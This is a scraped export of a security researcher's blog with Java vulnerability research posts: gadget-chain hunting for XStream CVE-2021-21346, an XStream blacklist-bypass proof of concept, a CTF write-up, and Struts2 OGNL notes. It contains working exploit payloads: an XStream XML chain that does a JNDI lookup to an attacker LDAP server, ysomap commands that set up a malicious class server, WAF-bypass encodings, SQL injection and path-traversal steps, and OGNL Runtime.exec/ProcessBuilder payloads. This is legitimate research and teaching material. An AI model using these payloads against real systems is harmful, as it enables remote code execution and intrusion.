{"pages":[{"title":"","permalink":"http://blog.0kami.cn/404.html","text":"404"},{"title":"About","permalink":"http://blog.0kami.cn/about/index.html","text":"A web 🐶 &amp;&amp; Code reviewer &amp;&amp; Pentester☠️ opens source tools ysomap:A helpful Java Deserialization exploit framework based on ysoserial MonitorClient: A web server local monitor &amp; webshell scan and kill tool MonitorServer: A web server remote monitor &amp; webshell scan and kill tool"},{"title":"Search","permalink":"http://blog.0kami.cn/search/index.html","text":""}],"posts":[{"title":"如何高效的挖掘Java反序列化利用链？","permalink":"http://blog.0kami.cn/2021/03/14/java-how-to-find-gadget-chains/","text":"#1 前言Java反序列化利用链一直都是国内外研究热点之一，但当前自动化方案gadgetinspector的效果并不好。所以目前多数师傅仍然是以人工+自研小工具的方式进行利用链的挖掘。目前我个人也在找一个合适的方法来高效挖掘利用链，本文将主要介绍我自己的一些挖掘心得，辅以XStream反序列化利用链CVE-2021-21346为例。 #1 前置知识这里前置知识主要有两类：XStream反序列化利用链的原理和图数据库查询语法 XStream反序列化利用链原理 这里具体的原理可以见回顾XStream反序列化漏洞，这里我们只需知道XStream在反序列化的过程中它的限制是很少的（不用PureJavaReflectionProvider），它甚至能还原构造好的Method对象。所以这里我们需要清楚的是它的触发函数source是什么，看我上面那篇文章能知道共有hashCode函数（Map方式）、compareTo函数（TreeSet方式）、compare函数（PriorityQueue方式）。 图数据库查询语法 这里用到了我即将开源的工具tabby，该工具将jar文件转化为代码属性图，然后后续我们可以用neo4j的图数据库查询语法进行利用链的查找，所以我们需要有一定的图数据库查询语法的基础 #2 利用链挖掘首先本次针对的是JDK相关Jar文件的利用链检测分析，所以先使用tabby生成JDK相关的代码属性图至图数据库。执行完以下两句命令，可以生成一个28w数据节点，76w关系边的代码属性图： 1234# 生成图缓存文件java -Xmx6g -jar target/tabby-1.0.0-SNAPSHOT.jar --isJDKOnly# 导入Neo4j图数据java -Xmx6g -jar target/tabby-1.0.0-SNAPSHOT.jar --isSaveOnly 接下来，构造图查询语言，这里提供一个模版 1234match (source:Method) // 添加where语句限制source函数match (sink:Method &#123;IS_SINK:true&#125;) // 添加where语句限制sink函数call apoc.algo.allSimplePaths(m1, source, \"&lt;CALL|ALIAS\", 12) yield path // 查找具体路径,12代表深度，可以修改return * limit 20 当前我们已经确定了当前可以使用hashCode函数、compareTo函数、compare函数作为source函数，那么只要再限制sink函数即可，如下查询语句 1234match (source:Method &#123;NAME:&quot;compare&quot;&#125;)match (sink:Method &#123;IS_SINK:true, NAME:&quot;invoke&quot;&#125;)&lt;-[:CALL]-(m1:Method)call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 20) yield path return * limit 20 本次利用链将限制危险函数为Method.invoke函数，具体查询结果如下图所示 可以看到末端的危险函数调用点为sun.swing.SwingLazyValue#createValue，来看一下具体的代码 123456789101112131415161718192021222324public Object createValue(final UIDefaults table) &#123; try &#123; ReflectUtil.checkPackageAccess(className); Class&lt;?&gt; c = Class.forName(className, true, null); if (methodName != null) &#123; Class[] types = getClassArray(args); Method m = c.getMethod(methodName, types); makeAccessible(m); return m.invoke(c, args); &#125; else &#123; Class[] types = getClassArray(args); Constructor constructor = c.getConstructor(types); makeAccessible(constructor); return constructor.newInstance(args); &#125; &#125; catch (Exception e) &#123; // Ideally we would throw an exception, unfortunately // often times there are errors as an initial look and // feel is loaded before one can be switched. Perhaps a // flag should be added for debugging, so that if true // the exception would be thrown. &#125; return null;&#125; 从代码上看，该函数可以调用任意的静态函数或任意对象的构造函数。那么我们就先确定当前这个函数是否是可用的，即找到合适的静态函数或构造函数，该函数会调用某些危险函数从而达成代码执行或命令执行。这里也同样构造图查询语句进行合适函数的查找，暂时限定危险函数为exec、lookup、invoke。 找到了一个可以用的函数&lt;javax.naming.InitialContext: java.lang.Object doLookup(java.lang.String)&gt;，该静态函数可以进行JNDI注入攻击。 所以到这里我们就能确定当前的sun.swing.SwingLazyValue#createValue是可以利用的节点。 那么根据前一个查询结果，我们继续进行分析javax.swing.UIDefaults#getFromHashtable。 1234567891011121314151617181920private Object getFromHashtable(final Object key) &#123; /* Quickly handle the common case, without grabbing * a lock. */ Object value = super.get(key); // ... /* At this point we know that the value of key was * a LazyValue or an ActiveValue. */ if (value instanceof LazyValue) &#123; try &#123; /* If an exception is thrown we'll just put the LazyValue * back in the table. */ value = ((LazyValue)value).createValue(this); &#125; // ... &#125; javax.swing.UIDefaults是Hashtable&lt;Object,Object&gt;的另一个实现，所以这里super.get(key)获取到的value值对于我们来说是可以任意填充的，那么此处填充前面的sun.swing.SwingLazyValue对象即可触发createValue函数的调用。 从getFromHashtable函数开始，调用对象的情况开始变多了起来，此时需要对每一条进行分别分析，但多数情况简单看一下就能确定当前的传递情况是否可延续。 此处，我就直接讲CVE-2021-21346的利用链。 javax.swing.UIDefaults#get函数 1234public Object get(Object key) &#123; Object value = getFromHashtable( key ); return (value != null) ? value : getFromResourceBundle(key, null);&#125; get函数延续了key的传递，继续往上分析 javax.swing.MultiUIDefaults#get函数 12345678910111213141516public Object get(Object key)&#123; Object value = super.get(key); if (value != null) &#123; return value; &#125; for (UIDefaults table : tables) &#123; value = (table != null) ? table.get(key) : null; if (value != null) &#123; return value; &#125; &#125; return null;&#125; 该函数有两处地方调用了javax.swing.UIDefaults#get分别是第3行、第9行，所以在写poc的时候，可以直接替换类属性tables或hashtable本身的value值也可以。 继续向上，javax.swing.MultiUIDefaults#toString 123456789101112131415public synchronized String toString() &#123; StringBuffer buf = new StringBuffer(); buf.append(\"&#123;\"); Enumeration keys = keys(); while (keys.hasMoreElements()) &#123; Object key = keys.nextElement(); buf.append(key + \"=\" + get(key) + \", \"); &#125; int length = buf.length(); if (length &gt; 1) &#123; buf.delete(length-2, length); &#125; buf.append(\"&#125;\"); return buf.toString();&#125; toString函数遍历了当前hashtable所存储的内容，自然这里也就调用到了javax.swing.MultiUIDefaults#get函数（第7行）。 所以到此为止，我们有从toString函数到invoke函数的调用链了。 接下来就是找到触发函数到toString函数的调用链了，这里为了查询结果更为清晰，我们只查询从触发函数到toString函数的利用链情况。 1234match (source:Method) where source.NAME in [&quot;compareTo&quot;]match (sink:Method &#123;NAME:&quot;toString&quot;&#125;)&lt;-[r:CALL]-(m1:Method) where r.REAL_CALL_TYPE in [&quot;java.lang.Object&quot;]call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 6) yield path return * limit 20 这里比较难受的是三个触发函数和toString函数都是有大量实现的函数，所以如果要找到一条可用的得看不少时间。下图简单处理了一下（图中画的箭头只是一种可能性） 此处我们从compareTo开始讲，javax.naming.ldap.Rdn$RdnEntry#compareTo 1234567891011public int compareTo(RdnEntry that) &#123; int diff = type.compareToIgnoreCase(that.type); if (diff != 0) &#123; return diff; &#125; if (value.equals(that.value)) &#123; // try shortcut return 0; &#125; return getValueComparable().compareTo( that.getValueComparable());&#125; 这里的类属性value发起了equals函数，往下看com.sun.org.apache.xpath.internal.objects.XString#equals 12345678910111213141516public boolean equals(Object obj2) &#123; if (null == obj2) return false; // In order to handle the 'all' semantics of // nodeset comparisons, we always call the // nodeset function. else if (obj2 instanceof XNodeSet) return obj2.equals(this); else if(obj2 instanceof XNumber) return obj2.equals(this); else return str().equals(obj2.toString()); &#125; 这里直接调用了obj2的toString函数，所以连上前面的利用链完整的利用链就出来了 12345678javax.naming.ldap.Rdn$RdnEntry.compareTo com.sun.org.apache.xpath.internal.objects.XString.equal javax.swing.MultiUIDefaults.toString UIDefaults.get UIDefaults.getFromHashTable UIDefaults$LazyValue.createValue SwingLazyValue.createValue javax.naming.InitialContext.doLookup() 至此，CVE-2021-21346就挖出来了，相对于人工挖，当前的方法大幅度减少了利用链的可能性种类，同样，另一条CVE-2021-21351也是同样的方法可以发现，以后有空再补充些其他的案例:) #3 利用链构造当前这条利用链的构造相对来说比较简单，只需要构造好MultiUIDefaults即可，下面为部分构造代码，详细见LazyValue 1234567891011121314UIDefaults uiDefaults = new UIDefaults();Object multiUIDefaults = ReflectionHelper.newInstance(\"javax.swing.MultiUIDefaults\", new Object[]&#123;new UIDefaults[]&#123;uiDefaults&#125;&#125;);uiDefaults.put(\"lazyValue\", obj);Object rdnEntry1 = ReflectionHelper.newInstance(\"javax.naming.ldap.Rdn$RdnEntry\", null);ReflectionHelper.setFieldValue(rdnEntry1, \"type\", \"ysomap\");ReflectionHelper.setFieldValue(rdnEntry1, \"value\", new XString(\"test\"));Object rdnEntry2 = ReflectionHelper.newInstance(\"javax.naming.ldap.Rdn$RdnEntry\", null);ReflectionHelper.setFieldValue(rdnEntry2, \"type\", \"ysomap\");ReflectionHelper.setFieldValue(rdnEntry2, \"value\", multiUIDefaults);return PayloadHelper.makeTreeSet(rdnEntry2, rdnEntry1); #4 总结13号的时候XStream发布了1.4.16，共修复了11个CVE，其中还比较有意思的是threedr3am的classloader的利用方式，以及钟潦贵师傅的CVE-2021-21345（这条利用链很长，我当前只用tabby做了12个节点的查找，这条链大概有20个节点，嗯，很长）。相信这波完了之后，估计还能找到一些漏网之鱼XD"},{"title":"XStream 1.4.15 Blacklist Bypass","permalink":"http://blog.0kami.cn/2021/01/03/java-xstream-blacklist-bypass/","text":"#1 Gadget OverviewRecently, I found a new deserialzation gadget which can bypass the latest version of XStream. This gadget use the JDK to construct the gadget chain. I had tested the gadget chain to RCE (remote code execute) with the version of JDK8 (8u162). I think other version of JDK also could trigger this vulnerablity to the RCE. Let’s look at this gadget, and the detail is in part #3. 123456789TreeSet.putAlljavax.naming.ldap.Rdn$RdnEntry.compareTo com.sun.org.apache.xpath.internal.objects.XString.equal javax.swing.MultiUIDefaults.toString UIDefaults.get UIDefaults.getFromHashTable UIDefaults$LazyValue.createValue SwingLazyValue.createValue javax.naming.InitialContext.doLookup() #2 Poc1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;sorted-set&gt; &lt;javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;type&gt;ysomap&lt;/type&gt; &lt;value class=\"javax.swing.MultiUIDefaults\" serialization=\"custom\"&gt; &lt;unserializable-parents/&gt; &lt;hashtable&gt; &lt;default&gt; &lt;loadFactor&gt;0.75&lt;/loadFactor&gt; &lt;threshold&gt;525&lt;/threshold&gt; &lt;/default&gt; &lt;int&gt;700&lt;/int&gt; &lt;int&gt;0&lt;/int&gt; &lt;/hashtable&gt; &lt;javax.swing.UIDefaults&gt; &lt;default&gt; &lt;defaultLocale&gt;zh_CN&lt;/defaultLocale&gt; &lt;resourceCache/&gt; &lt;/default&gt; &lt;/javax.swing.UIDefaults&gt; &lt;javax.swing.MultiUIDefaults&gt; &lt;default&gt; &lt;tables&gt; &lt;javax.swing.UIDefaults serialization=\"custom\"&gt; &lt;unserializable-parents/&gt; &lt;hashtable&gt; &lt;default&gt; &lt;loadFactor&gt;0.75&lt;/loadFactor&gt; &lt;threshold&gt;525&lt;/threshold&gt; &lt;/default&gt; &lt;int&gt;700&lt;/int&gt; &lt;int&gt;1&lt;/int&gt; &lt;string&gt;lazyValue&lt;/string&gt; &lt;sun.swing.SwingLazyValue&gt; &lt;className&gt;javax.naming.InitialContext&lt;/className&gt; &lt;methodName&gt;doLookup&lt;/methodName&gt; &lt;args&gt; &lt;string&gt;ldap://localhost:1099/EvilObj&lt;/string&gt; &lt;/args&gt; &lt;/sun.swing.SwingLazyValue&gt; &lt;/hashtable&gt; &lt;javax.swing.UIDefaults&gt; &lt;default&gt; &lt;defaultLocale reference=\"../../../../../../../javax.swing.UIDefaults/default/defaultLocale\"/&gt; &lt;resourceCache/&gt; &lt;/default&gt; &lt;/javax.swing.UIDefaults&gt; &lt;/javax.swing.UIDefaults&gt; &lt;/tables&gt; &lt;/default&gt; &lt;/javax.swing.MultiUIDefaults&gt; &lt;/value&gt; &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;type&gt;ysomap&lt;/type&gt; &lt;value class=\"com.sun.org.apache.xpath.internal.objects.XString\"&gt; &lt;m__obj class=\"string\"&gt;test&lt;/m__obj&gt; &lt;/value&gt; &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;&lt;/sorted-set&gt; when you try to reproduce this vulnerablity, you should change the line 37’s content. For example, changing the ldap://localhost:1099/EvilObj to ldap://your-evil-ldap-server:port/Namespace #3 AnalysisFirst of all, XStream can deserialize a tag with &lt;sorted-set&gt; using the TreeSet/TreeMapConverter. And the recover process will call some object’s compareTo function and not in the default blacklist. So I try to find a Object with compareTo function. Using javax.naming.ldap.Rdn$RdnEntry.compareTo() 1234567891011public int compareTo(RdnEntry that) &#123; int diff = type.compareToIgnoreCase(that.type); if (diff != 0) &#123; return diff; &#125; if (value.equals(that.value)) &#123; // try shortcut return 0; &#125; return getValueComparable().compareTo( that.getValueComparable());&#125; The field value is a Object type, so we can use any type of class to transfer the chain. Using com.sun.org.apache.xpath.internal.objects.XString.equal() 12345678910111213141516public boolean equals(Object obj2)&#123; if (null == obj2) return false; // In order to handle the 'all' semantics of // nodeset comparisons, we always call the // nodeset function. else if (obj2 instanceof XNodeSet) return obj2.equals(this); else if(obj2 instanceof XNumber) return obj2.equals(this); else return str().equals(obj2.toString());&#125; The line 15 call the obj2.toString function, and not check the obj2‘s type. So we can find a anytype class with toString function. Using javax.swing.MultiUIDefaults.toString() 123456789101112131415public synchronized String toString() &#123; StringBuffer buf = new StringBuffer(); buf.append(\"&#123;\"); Enumeration keys = keys(); while (keys.hasMoreElements()) &#123; Object key = keys.nextElement(); buf.append(key + \"=\" + get(key) + \", \"); &#125; int length = buf.length(); if (length &gt; 1) &#123; buf.delete(length-2, length); &#125; buf.append(\"&#125;\"); return buf.toString();&#125; The line 7 trigger the get function. 123456789101112131415public Object get(Object key)&#123; Object value = super.get(key); if (value != null) &#123; return value; &#125; for (UIDefaults table : tables) &#123; value = (table != null) ? table.get(key) : null; if (value != null) &#123; return value; &#125; &#125; return null;&#125; And on getfunction, the line 9 call the javax.swing.UIDefaults.get() 1234public Object get(Object key) &#123; Object value = getFromHashtable( key ); return (value != null) ? value : getFromResourceBundle(key, null);&#125; Next, the line 2 trigger the getFromHashtable function. 12345678910111213private Object getFromHashtable(final Object key) &#123; // ... synchronized(this) &#123; value = super.get(key); // ... if (value instanceof LazyValue) &#123; try &#123; /* If an exception is thrown we'll just put the LazyValue * back in the table. */ value = ((LazyValue)value).createValue(this); &#125; When value is LazyValue type, trigger the javax.swing.UIDefaults$LazyValue.createValue(). Next, I found a implementation of LazyValue which can call any static method using reflection. Using sun.swing.SwingLazyValue.createValue() 123456789101112131415161718192021222324public Object createValue(final UIDefaults table) &#123; try &#123; ReflectUtil.checkPackageAccess(className); Class&lt;?&gt; c = Class.forName(className, true, null); if (methodName != null) &#123; Class[] types = getClassArray(args); Method m = c.getMethod(methodName, types); makeAccessible(m); return m.invoke(c, args); &#125; else &#123; Class[] types = getClassArray(args); Constructor constructor = c.getConstructor(types); makeAccessible(constructor); return constructor.newInstance(args); &#125; &#125; catch (Exception e) &#123; // Ideally we would throw an exception, unfortunately // often times there are errors as an initial look and // feel is loaded before one can be switched. Perhaps a // flag should be added for debugging, so that if true // the exception would be thrown. &#125; return null;&#125; The line 4 to 9 will call a class’s static method, so we should find a static method which can do something evil. I found the javax.naming.InitialContext.doLookup() method is a good choice. 1234public static &lt;T&gt; T doLookup(String name) throws NamingException &#123; return (T) (new InitialContext()).lookup(name);&#125; This method could launch a JNDI connection. So we can set up a evil LDAP/RMI server to execute arbitrary code we wanted. For example, using my tool ysomap to set up a LDAP server and evil http server 12345678910111213141516// set up a evil http serveruse exploit SimpleHTTPServeruse payload EvilFileWrapperuse bullet ClassWithEvilConstructorset lport 8088set path /EvilObj.classset classname EvilObjset body &quot;open -a Calculator&quot;set type classrun// set up a evil LDAP serveruse exploit LDAPRefListenerset lport 1099set codebase http://localhost:8088/set objectName EvilObjrun Then, try to deserialze the payload, you will get a calculator XD"},{"title":"【CTF】xnuca2020 easyjava","permalink":"http://blog.0kami.cn/2020/11/02/ctf-xnuca-2020-easyjava/","text":"0x00 前言easyjava的设计思路主要来源于现实环境中遇到的一些问题，以及最近刚出的mybatis二级缓存反序列化的安全问题的一种设想。题目的设计目的主要考察选手对于实操性的漏洞的利用以及源码审计能力。 具体的考点如下： 任意文件下载，/proc/self/fd的利用 mybatis缓存反序列化漏洞，CVE-2020-26945 xstream反序列化利用，简单正则waf绕过，类比fastjson unicode编码绕过 高版本java版本下的jndi利用 0x01 预期题解题目本身设计的功能点比较少，主要是jpg图片签名，下载和验签功能 #1 源码获取这里首先关注下载的接口 在返回包里存在Check字段，于get请求中的sign字段是一样的内容，尝试修改filename为../../../../../../etc/passwd check字段返回了不一样的内容，这里判断可能sign值用于校验，通过才返回结果，那么修改sign字段，即可获取到当前请求的内容。接下来，由于是linux系统，我们可以通过暴力fd值来获取到当前运行的jar包内容，如/proc/self/fd/4来获取jar包 #2 mybatis SQL注入拿到jar反编译后先看pom，其中比较容易关注的主要是两个jar包，一个是mybatis的springboot包，另一个是xstream的包 如果关注cve动态的话，可以知道最近刚出的漏洞CVE-2020-26945，虽然mybatis的版本已经进行了升级，但spring的mybatis包中的mybatis依赖并没有升级，仍然是3.5.5版本，再确定一下，是否启用了cache 从mapper对应的xml配置里可以看到开启了cache配置，并且findByHashAndSecret接口存在注入。 到这里就简单了，我们只要找一下，调用点确认是否可控，即可确认是否存在注入 nese.game.controller.CheckController存在链路，从文件中获取内容，并进行数据库查询，所以这边我们能达到一个注入的效果 #3 mybatis二级缓存反序列化漏洞接下来，继续进行审计，关注一下另一个点xstream包的安全问题。在nese.game.entity.Picture对象上，调用了xstream的fromXML函数，并且在readObject函数处对字符串类型的xml进行还原 到这里就比较清晰了，我们需要利用前面发现的SQL注入点，进行注入构造任意的xml数据 并利用mybatis的默认二级缓存使用serialization的原理（如下图官方文档所示），来触发xstream反序列化漏洞 接下来，就根据题目的签名实现，来注入任意数据，以如下代码为例，生成存在注入语句的jpg文件 1234567891011121314try&#123; String payload = &quot;evil xml&quot;; File file = new File(&quot;xxxx.jpg&quot;); File dest = new File(&quot;xxxx.jpg&quot;); InputStream inputStream = new FileInputStream(file); byte[] bytes = new byte[(int)file.length()]; inputStream.read(bytes); InputStream destInputStream = new FileInputStream(dest); String secret=&quot;&apos; union select 13,&apos;wh1t3p1g&apos;,&apos;wh1t3p1g&apos;,&apos;&quot;+payload+&quot;&apos;,&apos;aed2bebb781ae32d94c5e67185e35149&quot;; String hash = &quot;aed2bebb781ae32d94c5e67185e35149&quot;; ImageUtil.transferTo(inputStream, bytes, null, dest, secret, hash);&#125;catch (Exception e)&#123; e.printStackTrace();&#125; 提交后可以看到具体的效果，重复提交两次，即可触发xml的反序列化 #4 XStream正则waf绕过从题目上来看，XStream的实现需要绕过两个点： PureJavaReflectionProvider PureJavaReflectionProvider不支持不存在无参构造函数的类的还原，以及该类如果是可序列化的，那么它的readObject不能有类属性上的还原。这是因为PureJavaReflectionProvider对于反序列化的操作，并非是一个递归的过程，有空再写这个分析：） 正则waf 题目并没有遵循XStream官方的类禁用方法，而是采用正则的方式先对待反序列化的xml字符串进行检测，检测通过后再进行反序列化。 关于第一个点，比较容易解决，参考marshalsec对于spring jndi利用链的实现，该链符合我说的要求 而对于第二个点，这里没有用官方的方法，提示了我们需要对字符串上做些操作来绕过正则waf。我们参考fastjson的@type的unicode编码绕过方式，再看看是否对于XStream，也同样存在这种问题？ 答案是肯定的，介绍一下XStream的编码绕过： 针对标签黑名单的绕过 以spring jndi利用链为案例 12&lt;org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt;&lt;/org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt; 当前黑名单为org[.]springframework，此时的绕过方法可以为 12&lt;org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt;&lt;/org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt; 这里的原理在于xstream会对符合格式的16进制做转换 com.thoughtworks.xstream.io.xml.AbstractXmlReader#unescapeXmlName com.thoughtworks.xstream.io.xml.XmlFriendlyNameCoder#decodeName 12345678910111213141516171819for (; i &lt; length; i++ ) &#123; char c = name.charAt(i); if (c == dollarReplacementFirstChar &amp;&amp; name.startsWith(dollarReplacement, i)) &#123; i += dollarReplacement.length() - 1; result.append('$'); &#125; else if (c == hexPrefixFirstChar &amp;&amp; name.startsWith(hexPrefix, i)) &#123; // 处理hex格式的标签内容，其正确格式为_.xxxx i += hexPrefix.length(); c = (char)Integer.parseInt(name.substring(i, i + 4), 16); i += 3; result.append(c); &#125; else if (c == escapeReplacementFirstChar &amp;&amp; name.startsWith(escapeCharReplacement, i)) &#123; i += escapeCharReplacement.length() - 1; result.append('_'); &#125; else &#123; result.append(c); &#125;&#125; 从dollarReplacement，hexPrefix，escapeCharReplacement三者来看，最终不影响我们绕过的为16进制的处理_.xxxx转换成实际的字符。 针对标签属性内容的绕过 案例 12&lt;org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor serialization=\"custom\"&gt;&lt;/org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt; 此时的黑名单为custom，那么绕过方法可以为 12&lt;org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor serialization=\"cust&amp;#111;m\"&gt;&lt;/org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt; 原理为读取属性内容时，会做符合要求的转化 com.sun.org.apache.xerces.internal.impl.XMLScanner scanAttributeValue 该函数内容比较多，不贴出来了，从883行到942行均在处理html编码格式，并将其转化为实际的字符 所以这里&amp;#111;将转化为o 针对标签内容的绕过 案例 123&lt;test&gt;ldap://xxxxx&lt;/test&gt; 此时的黑名单为ldap://，可以用如下的几种方法绕过 a. html编码 这部分在提取数据时，同样对html编码的内容做了转化 123&lt;test&gt;&amp;#108;dap://xxxxx&lt;/test&gt; 这部分跟上面标签属性内容的绕过的一样，不再叙述 b. 注释的方法 在处理实际的标签内容时，遇到注视内容将被忽略掉 123&lt;test&gt;ld&lt;!-- test --&gt;ap://xxxxx&lt;/test&gt; com.thoughtworks.xstream.converters.reflection.AbstractReflectionConverter#unmarshallField com.thoughtworks.xstream.io.xml.AbstractPullReader#getValue 123456789101112131415161718192021222324252627282930public String getValue() &#123; // ... Event event = readEvent(); while (true) &#123; if (event.type == TEXT) &#123; // 处理字符 String text = event.value; if (text != null &amp;&amp; text.length() &gt; 0) &#123; if (last == null) &#123; last = text; &#125; else &#123; if (buffer == null) &#123; buffer = new StringBuffer(last); &#125; buffer.append(text); &#125; &#125; &#125; else if (event.type != COMMENT) &#123;// 非字符 且 不是注释时 跳出 break; &#125; event = readEvent(); // 继续 &#125; reset(); if (buffer != null) &#123; return buffer.toString(); &#125; else &#123; return (last == null) ? \"\" : last; &#125;&#125; 从前面的代码中来看，这里主要在对字符进行拼接，并且遇到注释时将跳过，所以如果在内容中添上注释也能达到绕过的效果 经过上面XStream类型解析分析，我们可以构造出绕过正则waf的payload来 #5 高版本JNDI注入的利用在生成具体的exp后，可以对外发起JNDI连接，到这一步，我们需要去判断其为高版本jdk还是低版本的jdk。如果是低版本的jdk，我们可以直接利用codebase加载任意的class来达到命令执行的效果，而高版本的jdk只能依赖本地ObjectFactory或本地利用链来进行攻击，参考KINGX的文章。 而本题考查的为高版本jdk环境下的利用，那么就有两种选择，一为本地利用链触发命令来执行，二为本地ObjectFactory达成代码执行。 从题目的依赖来看，我们并不能找到一个合适的本地利用链来达成利用，那么考察的就是第二个方法的利用了。因为题目用的是spring boot embedded tomcat，所以我们能直接利用KINGX师傅文章中提到的方法，具体的利用过程不提了，可以用我的ysomap来达成命令执行的效果 0x02 expexp.java"},{"title":"【notes】struts2历史漏洞分析","permalink":"http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/","text":"0x00 前言 17年的时候整理过struts2相关的POC，时隔3年，虽然struts2已经不再那么流行了，但是还是有很大的研究价值，本文将一点一点跟一下struts2 有价值的漏洞XD 0x01 基础 struts2 源码下载https://archive.apache.org/dist/struts/source/ struts2工作流程 https://blog.csdn.net/snow_7/article/details/51513381 ognl表达式https://www.cnblogs.com/renchunxiao/p/3423299.html struts2 技术内幕 第6章 OGNL struts2漏洞的产生通OGNL表达式的执行有很大的关联，历史上很多版本的漏洞，都是因为不安全的用户输入流转到了Ognl.getValue、Ognl.setValue而导致的OGNL表达式的计算。后文不对Ognl后续的内容做分析 123// 调用静态函数 执行命令Ognl.getValue(\"@java.lang.Runtime@getRuntime().exec('open /Applications/Calculator.app/')\", context);Ognl.setValue(\"(\\\"@java.lang.Runtime@getRuntime().exec(\\'open /System/Applications/Calculator.app/\\')\\\")(bla)(bla)\",context,\"\"); 更多用法看http://commons.apache.org/proper/commons-ognl/language-guide.html 其中关于setValue的利用用的是Expression Evaluation部分，(1)(2)(3)中(1)(2)被作为一个整体解析，对于(1)做表达式的解析，如果你用getValue((1)(2))会发现其实也能执行命令，而setValue((1)(2)(3))需要double evaluation，实际上变成((1)(2))(3)，在后续调用setValueBody函数时取出的children[0]就是(1)(2)，等同于调用Ognl.getValue((1)(2))的效果。所以这里调用setValue也同样可以达成getValue的计算OGNL表达式的效果。 同样，我们也可以利用children[1]的位置，如(1)((2)(3))把payload放到(2)(3) 关于setValue函数的另一种利用方法S2-009的方式a[(1)(2)]，其中(1)(2)后续会单独拿出来被当作OGNL表达式执行。 0x02 历史版本回顾 1. S2-001参考：https://xz.aliyun.com/t/2044 漏洞产生原因在于：用&lt;s:textfield&gt;标签，原样返回用户输入时，会过一次OGNL表达式的解析执行。比如场景登陆的地方，用户名密码校验错误，不跳转页面，直接将用户名和密码放到页面解析后返回。 source: 使用了s:textfield标签用于表单生成，当用户输入不合法时，将用户的输入内容渲染到返回的页面上 sink: jsp渲染调用doEndTag，后续由于识别出用户输入中OGNL表达式而调用Ognl.getValue 漏洞分析主要出问题的是JSP中&lt;s:textfield&gt;标签，Struts2里处理textfield的是org.apache.struts2.components.UIBean 看到在处理params时，当parameters里不存在value这个key的时候，会进到执行name相对应的value上来。并且altSyntax默认配置为true 会在当前的name左右加上OGNL表达式的标识%{name}，这里的name是&lt;s:textfield name=&quot;name&quot;，name字段的值，比如这里name=&quot;username&quot;，此时会变成%{username}.继续往下跟 这里的String类型的转化主要用了TextParesUtil.translateVariables()来处理，这里看看具体他怎么做的 com.opensymphony.xwork2.util.TextParseUtil#translateVariables#97 这里会去判断传入的expression是否是OGNL表达式的格式的%{xxx}，如果是的话，就会去OgnlValueStack里面去找对应的内容(这块就是OGNL表达式的计算结果，findValue函数后续会去调用OgnlUtil.getValue，详细的可以看我基础里列的文章) 所以这里我们第一遍传入的%{name}会解析获得对应的值%{@java.lang.Runtime.....} 第二遍会去解析%{@java.lang.Runtime....}，这里执行了我们想要执行的命令。 回显POC前面简单用了OGNL表达式调用静态方法的形式来执行系统命令@java.lang.Runtime@getRuntime().exec(command) 这里S2-001其实是会直接回显的，将替换原有的input标签的内容，这里换一种方式来进行回显，利用Struts2的HttpServletResponse来写入内容。 1234#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#writer.println(xxxxxx),#writer.flush(),#writer.close() 先从上下文context中取出HttpServletResponse的实例，用到的实际是HttpServletResponseWrapper 然后获取当前response的writer对象，在利用该writer来写入任意内容 比如 1%&#123;#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#writer.println(&quot;wh1t3p1g&quot;),#writer.flush(),#writer.close()&#125; 当然你也可以替换成执行命令后的内容 1234567891011121314#pb=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),#is=#pb.getInputStream(),#isr=new InputStreamReader(#is),#br=new BufferedReader(#isr),#chars=new char[500],#br.read(#chars),#str=new java.lang.String(#chars),// 上面主要获取执行后的内容，下面主要做回显操作#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#writer.println(#str),#writer.flush(),#writer.close()%&#123;#pb=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),#is=#pb.getInputStream(),#isr=new java.io.InputStreamReader(#is),#br=new java.io.BufferedReader(#isr),#chars=new char[500],#br.read(#chars),#str=new java.lang.String(#chars),#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(), #writer.println(#str),#writer.flush(),#writer.close()&#125; 修复在&gt;=2.0.9版本的struts2上，com.opensymphony.xwork2.util.TextParseUtil#translateVariables做了循环判断，不允许递归执行OGNL表达式 默认maxLoopCount为1，所以处理完%{name}后，不会再继续对他的值进行OGNL表达式的执行了。 2. S2-003影响范围：2.0.0 - 2.0.11.2 看官网的介绍，问题出在ParametersInterceptor，前面利用了Ognl.getValue来计算OGNL表达式，而S2-003用的则是Ognl.setValue，该函数也同样可以计算OGNL表达式 source: 参数的key，使用unicode编码绕过#的检测 sink: 调用Ognl.setValue 漏洞分析Struts2在处理参数内容时，将调用com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters函数，填充到OgnlVauleStack的context上下文里。 这里会先过一次acceptableName的检查（2.0.8版本） 不能出现=、,、#、:以及被排除在外的参数名 只有通过了acceptableName函数的检查才能继续往下走，所以我们必须绕过上面的几个问题，这里漏洞发现者用了unicode编码来绕过检测。 ognl.JavaCharStream#readChar 当遇到\\uunicode编码，会做一次转换，比如\\u0040会被转成@ 而acceptableName函数并没有考虑unicode编码的方式，导致其形同虚设。 回到setParameters，后续调用了OgnlValueStack.setValue 这里最终到了OgnlUtil.setValue计算OGNL表达式 POC分析来看一个调用命令执行的POC 